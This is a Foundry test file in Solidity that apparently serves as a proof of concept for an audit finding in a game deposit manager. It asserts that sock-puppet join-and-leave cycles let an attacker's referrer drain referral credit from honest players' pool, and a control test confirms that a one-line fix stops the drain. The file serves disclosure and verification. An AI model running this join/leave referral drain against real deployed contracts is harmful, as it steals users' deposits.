// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    DepositManagerVulnerable,
    DepositManagerFixed,
    MiniToken,
    Registry,
    Party,
    Referrer
} from "./65372-depositmanager-refundentryfee-doesnt-deduct-referral-rewards.sol";

contract RefundDoesNotDeductReferralTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant GAME_ID = 1;
    uint256 internal constant TICKET = 100 ether;

    // ── Exploit: join/leave sock-puppets inflate an unbacked referral credit
    //    that the attacker's referrer drains out of the honest pool. ──
    function test_exploit_refundOmitsReferralDecrement_drainsPool() public {
        Exploit e = new Exploit();
        e.run();

        // 5 socks * 100e18 ticket * 200bp / 10000 = 10e18 stolen.
        assertEq(e.stolenToAttacker(), 10 ether, "attacker extracted 10 MJT");
        assertGt(e.stolenToAttacker(), 0, "theft occurred");

        // The socks cost the attacker nothing (fully refunded each cycle).
        assertEq(e.attackerCost(), 0, "attacker sock net cost is zero");

        // The 10e18 came straight out of the pool the honest players funded.
        assertEq(e.poolAfter(), e.poolBefore() - e.stolenToAttacker(), "pool drained by claim");

        // Honest players deposited 300e18 but the pool retains only 290e18:
        // it can no longer cover their entitlements -> insolvent for winners.
        assertEq(e.honestDeposits(), 300 ether, "honest deposits");
        assertEq(e.poolAfter(), 290 ether, "pool short after theft");
        assertLt(e.poolAfter(), e.honestDeposits(), "pool cannot cover honest deposits");

        // The stolen tokens really sit at the attacker EOA.
        MiniToken token = MiniToken(e.tokenAddr());
        assertEq(token.balanceOf(ATTACKER), 10 ether, "attacker EOA holds stolen tokens");
    }

    // ── Negative control: the real one-line fix (decrement in _refundEntryFee)
    //    makes the referral credit net to zero, so the claim yields nothing. ──
    function test_control_fixedRefundDecrements_noDrain() public {
        MiniToken token = new MiniToken("Majority Token", "MJT");
        Registry registry = new Registry();
        DepositManagerFixed dm = new DepositManagerFixed(address(registry));
        Referrer referrer = new Referrer();

        dm.createGamePool(GAME_ID, TICKET, address(token));

        // 3 honest players fund the pool and stay.
        for (uint256 i = 0; i < 3; i++) {
            Party honest = new Party(token, address(dm));
            token.mint(address(honest), TICKET);
            dm.join(GAME_ID, address(honest));
        }

        // 5 socks join+leave, all pointing at the attacker's referrer.
        for (uint256 i = 0; i < 5; i++) {
            Party sock = new Party(token, address(dm));
            token.mint(address(sock), TICKET);
            registry.setReferrer(address(sock), address(referrer));
            dm.join(GAME_ID, address(sock));
            dm.leave(GAME_ID, address(sock));
        }

        uint256 poolBefore = token.balanceOf(address(dm));
        referrer.claimToFixed(dm, token, GAME_ID, ATTACKER);
        uint256 poolAfter = token.balanceOf(address(dm));

        // With the fix, nothing is claimable and the pool is untouched.
        assertEq(token.balanceOf(ATTACKER), 0, "no tokens stolen under fix");
        assertEq(poolAfter, poolBefore, "pool untouched under fix");
        assertEq(poolAfter, 300 ether, "full honest deposits preserved");
    }
}
